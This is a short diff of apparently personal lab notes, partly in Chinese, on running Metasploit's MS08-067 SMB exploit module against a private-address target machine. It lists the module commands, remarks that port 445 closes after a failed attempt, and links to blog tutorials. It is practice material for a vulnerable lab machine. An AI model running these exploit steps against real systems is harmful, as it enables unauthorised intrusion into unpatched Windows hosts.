@@ -1,6 +1,6 @@
 search ms08-067
 use exploit/windows/smb/ms08_067_netapi
-set RHOST 192.168.1.227
+set RHOST 192.168.1.227  目标靶机
 show targets 显示有漏洞的操作系统
 
 下载靶机  
@@ -15,3 +15,5 @@ https://blog.csdn.net/xyx107/article/details/79151025
 失败 
 
 一次失败后  445口 就会关闭 虽然netstat能查出来
+
+https://blog.csdn.net/max_ii_min/article/details/104380097
